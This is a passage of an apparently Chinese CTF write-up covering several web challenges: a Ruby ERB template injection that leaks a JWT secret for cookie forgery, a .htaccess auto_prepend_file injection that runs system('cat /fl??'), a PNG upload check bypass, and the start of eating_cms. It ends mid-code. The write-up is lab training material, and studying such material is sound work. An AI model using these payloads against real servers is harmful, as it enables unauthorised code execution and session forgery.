<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">unless</span> params[<span class="hljs-symbol">:SECRET</span>].<span class="hljs-literal">nil</span>?<br>    <span class="hljs-keyword">if</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:SECRET</span>].match(<span class="hljs-regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)<br>      puts <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
<p>这里要是 SECRET 参数存在则对其进行匹配，匹配到了就输出flag<br>但这里既然有匹配，就可以用全局变量读出来了，也就是用 $&#96; 来读取匹配前的内容</p>
<p>如果传入的参数do和name一致，则会输出<code>&#123;params[:name][0,7]&#125; </code>working successfully!<br>使用Ruby的预定义变量$’(最后一次成功匹配右边的字符串)<br>正常传的话<br><img src="/images/A942F6C4E6014f97A130890CFC6B2639.png" srcset="/img/loading.gif" lazyload></p>
<p>只要满足了这个if <code>if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</code>，就会进行模板渲染。<br>具体参考这个文章<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86867">【技术分享】手把手教你如何完成Ruby ERB模板注入</a><br>但是这题有长度的限制，除去&lt;%&#x3D;%&gt;，就只剩下2个字符可用了。可以用ruby的预定义变量<br><a target="_blank" rel="noopener" href="https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html">预定义变量</a><br>使用Ruby的预定义变量$’(最后一次成功匹配右边的字符串)</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt;%=$&#x27;%&gt;<br></code></pre></td></tr></table></figure>
<p>构造一下payload</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/work?SECRET=&amp;name=&lt;%=$&#x27;%&gt;&amp;<span class="hljs-keyword">do</span>=&lt;%=$&#x27;%&gt; is working<br></code></pre></td></tr></table></figure>
<p>直接用会报错<br>url编码一下</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/work?SECRET<span class="hljs-operator">=</span>&amp;name<span class="hljs-operator">=</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%24</span><span class="hljs-variable">%27</span><span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>e&amp;do<span class="hljs-operator">=</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%24</span><span class="hljs-variable">%27</span><span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>working<br></code></pre></td></tr></table></figure>

<p><img src="/images/F270D8590A114303A04FCBE3C5E8C616.png" srcset="/img/loading.gif" lazyload></p>
<p>这样secret密钥就出来了，对JWT进行修改加密<br><img src="/images/49B8B6BAAA2547bcB351BD304945D36A.png" srcset="/img/loading.gif" lazyload><br>对cookie内容替换<br>值成功改变<br><img src="/images/83F485747A584b6d88E217284FE4B8D5.png" srcset="/img/loading.gif" lazyload><br>buy flag<br><img src="/images/2944AD4BF4974e64813DEC107D945E76.png" srcset="/img/loading.gif" lazyload><br>没有直接回显flag<br>再买下flag<br>可以看到cookies的值明显多了<br><img src="/images/45EEAAFF94D64b87B05F17CBDF9858F8.png" srcset="/img/loading.gif" lazyload><br>JWT解密一下<br><img src="/images/6579FF1931A549128C5507C83B77B03B.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="羊城杯2020-easyphp"><a href="#羊城杯2020-easyphp" class="headerlink" title="[羊城杯2020]easyphp"></a>[羊城杯2020]easyphp</h2><p>先看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;on&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;html&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;type&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;flag&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;upload&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;file&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[^a-z\.]/&quot;</span>, <span class="hljs-variable">$filename</span>) == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span> . <span class="hljs-string">&quot;\nHello, world&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams">foreach(<span class="hljs-symbol">$</span><span class="hljs-keyword">files</span> as <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(is_file(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                unlink(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>除index.php的文件会被删除</p>
<p>还有这一段值得注意</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[^a-z\.]/&quot;</span>, <span class="hljs-variable">$filename</span>) == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br></code></pre></td></tr></table></figure>
<p>这里是取反并不是匹配第一个字符，所以不是换行绕过，这里表示如果匹配除a-z和.外的所有字符都会返回1</p>
<p>本题利用的是file_put_contents这一函数，我们需要通过文件上传一个.htaccess来绕过过滤并执行命令<br>.htaccess<br>把.htaccess加载到php文件的前面，这边的话以注释的方法来写shell</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php_value auto_append_file .htaccess</span><br><span class="language-xml">#</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();</span><br></code></pre></td></tr></table></figure>

<p>虽然过滤了file，但我们可以用\来绕过，#应该是.hatccess文件特有的写入形式，没有的话会直接报错500</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php_value auto_prepend_fil\ </span><br><span class="language-xml">e .htaccess </span><br><span class="language-xml">#</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /fla&#x27;</span>.<span class="hljs-string">&#x27;g&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">\ </span><br></code></pre></td></tr></table></figure>
<p>末尾加个\是为了转义\n，如果不加就会变为下面这种，不符合.htaccess的规则</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php_value auto_prepend_fil\ </span><br><span class="language-xml">e .htaccess </span><br><span class="language-xml">#</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /fla&#x27;</span>.<span class="hljs-string">&#x27;g&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">Hello, world</span><br></code></pre></td></tr></table></figure>
<p>再末尾价格反斜杠会把\n前面的\给转义掉，这样就变为了如下这样：</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php_value auto_prepend_fil\ </span><br><span class="language-xml">e .htaccess </span><br><span class="language-xml">#</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /fla&#x27;</span>.<span class="hljs-string">&#x27;g&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">nHello, world</span><br></code></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?filename=.htaccess&amp;content=php_value auto_prepend_fil\</span><br><span class="language-xml">e .htaccess</span><br><span class="language-xml">#</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">\</span><br></code></pre></td></tr></table></figure>
<p>编码一下，如果不编码的话就不在同一行，传的时候不好传，最后的反斜杠后面不能有空格，有空格就转不了\</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?filename<span class="hljs-operator">=</span>.htaccess&amp;content<span class="hljs-operator">=</span>php_value<span class="hljs-variable">%20</span>auto_prepend_fil<span class="hljs-variable">%5</span>C<span class="hljs-variable">%0</span>Ae<span class="hljs-variable">%20</span>.htaccess<span class="hljs-variable">%0</span>A<span class="hljs-variable">%23</span><span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>Fphp<span class="hljs-variable">%20</span>system(&#x27;ls<span class="hljs-variable">%20</span>/&#x27;)<span class="hljs-variable">%3</span>B<span class="hljs-variable">%3</span>F<span class="hljs-variable">%3</span>E<span class="hljs-variable">%5</span>C<br></code></pre></td></tr></table></figure>
<p>获得flag，虽然它过滤了flag，但我们可以用fl??来代替flag，或者用字符串连接，例如’cat%20&#x2F;fla’.’g’<br>cat flag</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?filename<span class="hljs-operator">=</span>.htaccess&amp;content<span class="hljs-operator">=</span>php_value<span class="hljs-variable">%20</span>auto_prepend_fil<span class="hljs-variable">%5</span>C<span class="hljs-variable">%0</span>Ae<span class="hljs-variable">%20</span>.htaccess<span class="hljs-variable">%0</span>A<span class="hljs-variable">%23</span><span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>Fphp<span class="hljs-variable">%20</span>system(&#x27;cat<span class="hljs-variable">%20</span>/fl??&#x27;)<span class="hljs-variable">%3</span>B<span class="hljs-variable">%3</span>F<span class="hljs-variable">%3</span>E<span class="hljs-variable">%5</span>C<br></code></pre></td></tr></table></figure>
<p><img src="/images/9CDFC2FAE9134599988E2264C037C163.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="HarekazeCTF2019-Avatar-Uploader"><a href="#HarekazeCTF2019-Avatar-Uploader" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader"></a>[HarekazeCTF2019]Avatar Uploader</h2><p><img src="/images/DB5ED107BE9F499f84755042BB02A582.png" srcset="/img/loading.gif" lazyload><br>先登录，用户名大于等于4个字符就好了，随便起个名<br><img src="/images/C1F1305830324a61B646FCAE657F2699.png" srcset="/img/loading.gif" lazyload><br>上传文件<br>它给了上传png的条件<br>先看GIF89a能不能绕过<br>并不能<br>hint要求是png格式<br>改下16进制文件头看是否能绕过<br>只改第一行就好了<br><img src="/images/30305154EC44adaA5597737D3476448.png" srcset="/img/loading.gif" lazyload><br>上传后竟然直接给了flag<br><img src="/images/F9454A351E8E4736BEE5178E7FC106F3.png" srcset="/img/loading.gif" lazyload><br>先看看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/util.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/session.php&#x27;</span>);<br><br><span class="hljs-variable">$session</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecureClientSession</span>(CLIENT_SESSION_ID, SECRET_KEY);<br><br><span class="hljs-comment">// check whether file is uploaded</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]) || !<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;No file was uploaded.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file size</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">256000</span>) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is too large.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file type</span><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-variable">$type</span> = <span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-title function_ invoke__">finfo_close</span>(<span class="hljs-variable">$finfo</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$type</span>, [<span class="hljs-string">&#x27;image/png&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is not PNG format.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file width/height</span><br><span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">256</span> || <span class="hljs-variable">$size</span>[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">256</span>) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded image is too large.&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">2</span>] !== IMAGETYPE_PNG) &#123;<br>  <span class="hljs-comment">// I hope this never happens...</span><br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG1&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ok</span><br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">4</span>)) . <span class="hljs-string">&#x27;.png&#x27;</span>;<br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_DIR . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$filename</span>);<br><br><span class="hljs-variable">$session</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;avatar&#x27;</span>, <span class="hljs-variable">$filename</span>);<br><span class="hljs-title function_ invoke__">flash</span>(<span class="hljs-string">&#x27;info&#x27;</span>, <span class="hljs-string">&#x27;Your avatar has been successfully updated!&#x27;</span>);<br><span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>在检查文件类型时，finfo_file()函数检测上传图片的类型是否是image&#x2F;png<br>在检查文件长宽时，getimagesize() 函数用于获取图像大小及相关信息，成功将返回一个数组，但其后面还有：<br>对于getimagesize() 函数返回的数组：</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Array<br>(<br>    [<span class="hljs-number">0</span>] <span class="hljs-operator">=</span>&gt; <span class="hljs-number">290</span><br>    [<span class="hljs-number">1</span>] <span class="hljs-operator">=</span>&gt; <span class="hljs-number">69</span><br>    [<span class="hljs-number">2</span>] <span class="hljs-operator">=</span>&gt; <span class="hljs-number">3</span><br>    [<span class="hljs-number">3</span>] <span class="hljs-operator">=</span>&gt; width<span class="hljs-operator">=</span><span class="hljs-string">&quot;290&quot;</span> height<span class="hljs-operator">=</span><span class="hljs-string">&quot;69&quot;</span><br>    [bits] <span class="hljs-operator">=</span>&gt; <span class="hljs-number">8</span><br>    [mime] <span class="hljs-operator">=</span>&gt; image/png<br>)<br></code></pre></td></tr></table></figure>
<p>结果解释：</p>
<ul>
<li>索引 0 给出的是图像宽度的像素值</li>
<li>索引 1 给出的是图像高度的像素值</li>
<li>索引 2 给出的是图像的类型，返回的是数字，其中1 &#x3D; GIF，2 &#x3D; JPG，3 &#x3D; PNG，4 &#x3D; SWF，5 &#x3D; PSD，6 &#x3D; BMP，7 &#x3D; TIFF(intel byte order)，8 &#x3D; TIFF(motorola byte order)，9 &#x3D; JPC，10 &#x3D; JP2，11 &#x3D; JPX，12 &#x3D; JB2，13 &#x3D; SWC，14 &#x3D; IFF，15 &#x3D; WBMP，16 &#x3D; XBM</li>
<li>索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签</image></li>
<li>索引 bits 给出的是图像的每种颜色的位数，二进制格式</li>
<li>索引 channels 给出的是图像的通道值，RGB 图像默认是 3</li>
<li>索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如：header(“Content-type: image&#x2F;jpeg”);</li>
</ul>
<p>先看这个</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[0] &gt; 256 || <span class="hljs-variable">$size</span>[1] &gt; 256) &#123;<br>  <span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;Uploaded image is too large.&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>我们在创建文件时并没有构造像素值，所以未报错</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">if</span> ($size[<span class="hljs-number">2</span>] !== IMAGETYPE_PNG) &#123;<br>  <span class="hljs-comment">// I hope this never happens...</span><br>  <span class="hljs-keyword">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . <span class="hljs-keyword">getenv</span>(<span class="hljs-string">&#x27;FLAG1&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);<br><br></code></pre></td></tr></table></figure>
<p>索引2返回的是数字不是PNG，将输出part 1的flag<br>这也就说的通了</p>
<p>为了获取到flag，我们需要绕过函数finfo_file()或函数getimagesize() 的验证<br>函数finfo_file()其主要是识别PNG文件十六进制下的第一行信息，若保留文件头信息，破坏掉文件长宽等其余信息，也就可以绕过getimagesize() 函数的检验</p>
<h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p><img src="/images/FC78743486744d5f8CCFD287B00DD12F.png" srcset="/img/loading.gif" lazyload><br>这个界面可以先考虑一下sql注入和弱密码爆破<br><img src="/images/B698F236EF52407f8579416F46F79A91.png" srcset="/img/loading.gif" lazyload><br>能看到sql注入的语句，这里有防火墙，不好注<br>发现register.php<br>先注册一个登录再说<br><img src="/images/9E71ACEE48494109A98B24B4E5CEEC15.png" srcset="/img/loading.gif" lazyload><br>疑似文件包含，伪协议读一下源码<br><img src="/images/E781083A39054812835970BA36905BD9.png" srcset="/img/loading.gif" lazyload><br>guest.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly &quot;</span>);<br>&#125;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;templates/guest.html&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>user.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;function.php&quot;</span>);<br><span class="hljs-keyword">if</span>( !<span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] ))&#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>    <span class="hljs-variable">$oper_you_can_do</span> = <span class="hljs-variable">$OPERATE_admin</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$oper_you_can_do</span> = <span class="hljs-variable">$OPERATE</span>;<br>&#125;<br><span class="hljs-comment">//die($_SESSION[&#x27;isadmin&#x27;]);</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span 